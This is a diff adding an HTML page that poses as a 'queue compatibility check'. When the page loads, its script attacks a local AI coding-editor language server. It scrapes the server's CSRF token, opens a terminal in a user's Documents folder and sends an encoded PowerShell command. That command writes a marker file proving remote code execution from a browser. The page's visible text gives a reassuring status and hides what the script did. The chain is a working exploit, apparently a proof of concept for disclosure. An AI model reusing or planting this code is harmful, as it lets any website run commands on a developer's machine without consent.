@@ -1,0 +1,65 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Queue compatibility check</title>
+<body>Checking queue compatibility…</body>
+<pre id="status"></pre>
+<script>
+(async () => {
+  const out = document.querySelector("#status");
+  const log = (value) => { out.textContent += value + "\n"; };
+  const port = new URL(location.href).searchParams.get("p") || "";
+  if (!/^\d{2,5}$/.test(port)) {
+    log("missing port");
+    return;
+  }
+  const base = "http://127.0.0.1:" + port;
+  const headersFor = (csrf) => ({
+    "Content-Type": "application/json",
+    "Connect-Protocol-Version": "1",
+    "x-codeium-csrf-token": csrf
+  });
+  const utf16leBase64 = (value) => {
+    let bytes = "";
+    for (let i = 0; i < value.length; i++) {
+      const code = value.charCodeAt(i);
+      bytes += String.fromCharCode(code & 0xff, code >>> 8);
+    }
+    return btoa(bytes);
+  };
+  try {
+    const root = await fetch(base + "/", {mode: "cors", credentials: "include", cache: "no-store"});
+    const html = await root.text();
+    log("root=" + root.status);
+    const match = html.match(/"csrfToken"\s*:\s*"((?:\\.|[^"\\])*)"/i);
+    if (!match) throw new Error("token missing");
+    const csrf = JSON.parse('"' + match[1] + '"');
+    const create = await fetch(base + "/exa.language_server_pb.LanguageServerService/CreateTerminal", {
+      method: "POST", mode: "cors", credentials: "include", headers: headersFor(csrf),
+      body: JSON.stringify({workspaceUri: "file:///C:/Users/Sivanesh/Documents"})
+    });
+    const created = await create.json();
+    const terminal = created.terminal || created;
+    log("create=" + create.status);
+    if (!create.ok || !terminal.terminalId) throw new Error("terminal create failed");
+    const script =
+      "$p=Join-Path $env:USERPROFILE 'antigravity-git-history-browser-rce.txt';" +
+      "$il=((whoami.exe /groups|Select-String -SimpleMatch 'Mandatory Label'|Select-Object -First 1).Line);" +
+      "$v=@('ANTIGRAVITY_GIT_HISTORY_BROWSER_RCE','PID='+$PID,'INTEGRITY='+$il);" +
+      "[IO.File]::WriteAllLines($p,$v);";
+    const command = "powershell.exe -NoLogo -NoProfile -NonInteractive -EncodedCommand " +
+      utf16leBase64(script) + "\r\n";
+    const input = await fetch(base + "/exa.language_server_pb.LanguageServerService/SendTerminalInput", {
+      method: "POST", mode: "cors", credentials: "include", headers: headersFor(csrf),
+      body: JSON.stringify({
+        terminalId: terminal.terminalId,
+        inputStreamId: terminal.terminalId,
+        input: btoa(command)
+      })
+    });
+    log("input=" + input.status);
+    document.body.firstChild.textContent = input.ok ? "Queue compatibility: current" : "Queue compatibility: unavailable";
+  } catch (error) {
+    log("error=" + error.name + ":" + error.message);
+  }
+})();
+</script>
